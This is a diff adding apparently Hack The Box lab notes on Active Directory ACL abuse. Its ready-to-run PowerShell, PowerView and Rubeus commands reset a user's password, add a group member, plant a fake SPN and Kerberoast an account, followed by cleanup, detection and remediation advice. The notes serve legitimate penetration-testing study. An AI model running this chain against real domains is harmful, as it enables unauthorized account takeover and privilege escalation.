@@ -1925,4 +1925,118 @@ PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentif
 **Viewing Pre-Build queries through BloodHound**
 ![image](https://github.com/user-attachments/assets/d1bd3858-f041-41ba-b18a-af3864ef8124)
 
+---
+
+# ACL Abuse Tactics
+
+## Overview
+This document outlines a step-by-step attack chain to escalate privileges in an Active Directory (AD) environment using Access Control List (ACL) abuse tactics. These techniques demonstrate how attackers leverage ACL misconfigurations to gain unauthorized access and escalate privileges.
+
+## Attack Chain Steps
+
+### Initial Setup
+1. **Compromised User (wley):**  
+   - NTLMv2 hash retrieved using Responder.  
+   - Hash cracked offline with Hashcat to obtain the cleartext password.  
+   - Goal: Escalate to the `adunn` user capable of performing a **DCSync attack**.
+
+2. **Objective:**  
+   - Use `wley` to change the password for `damundsen`.  
+   - Leverage `damundsen`’s permissions to gain access to critical groups.  
+   - Exploit nested group membership and **GenericAll** rights to control the `adunn` user.
+
+
+
+### Step 1: Change `damundsen` Password
+1. Authenticate as `wley`:
+   ```powershell
+   $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+   $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+   ```
+
+2. Set a new password for `damundsen`:
+   ```powershell
+   $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+   Import-Module .\PowerView.ps1
+   Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+   ```
+
+
+
+### Step 2: Add `damundsen` to Help Desk Level 1 Group
+1. Authenticate as `damundsen`:
+   ```powershell
+   $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+   $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+   ```
+
+2. Add to the group:
+   ```powershell
+   Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+   ```
+
+
+
+### Step 3: Exploit Nested Group Membership
+- Use inherited permissions via **GenericAll** to modify the `adunn` account.
+
+1. Create a fake SPN for `adunn`:
+   ```powershell
+   Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+   ```
+
+2. Perform Kerberoasting to retrieve the TGS hash:
+   ```powershell
+   .\Rubeus.exe kerberoast /user:adunn /nowrap
+   ```
+
+3. Crack the hash offline using Hashcat to obtain `adunn`’s password.
+
+
+
+## Cleanup Steps
+1. **Remove Fake SPN:**
+   ```powershell
+   Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+   ```
+
+2. **Remove `damundsen` from Group:**
+   ```powershell
+   Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+   ```
+
+3. **Reset `damundsen` Password:**  
+   Ensure `damundsen`’s password is restored to its original value or reset by the client.
+
+
+## Detection and Remediation
+
+### Detection
+1. **Monitor ACL Changes:**  
+   Enable **Advanced Security Audit Policy** and monitor **Event ID 5136** (Directory Object Modified).
+
+   Example of identifying changes using SDDL:
+   ```powershell
+   ConvertFrom-SddlString "$STRING" | Select -ExpandProperty DiscretionaryAcl
+   ```
+
+2. **Group Membership Monitoring:**  
+   Regularly audit and alert on changes to high-impact groups.
+
+### Remediation
+1. **Regular AD Audits:**  
+   Use tools like **BloodHound** to identify and remove dangerous ACLs.
+
+2. **Limit Permissions:**  
+   Remove unnecessary permissions and regularly review ACL configurations.
+
+3. **Deploy Monitoring Tools:**  
+   Combine AD monitoring tools with built-in Windows security features to detect attacks early.
+
+
+
+## Key Takeaways
+- **Understanding Attack Chains:** ACL abuse can escalate privileges quickly in poorly secured domains.
+- **Proactive Monitoring:** Regular auditing and monitoring are essential to prevent ACL abuse.
+- **Comprehensive Cleanup:** Document all changes during assessments and ensure no residual changes remain.
 
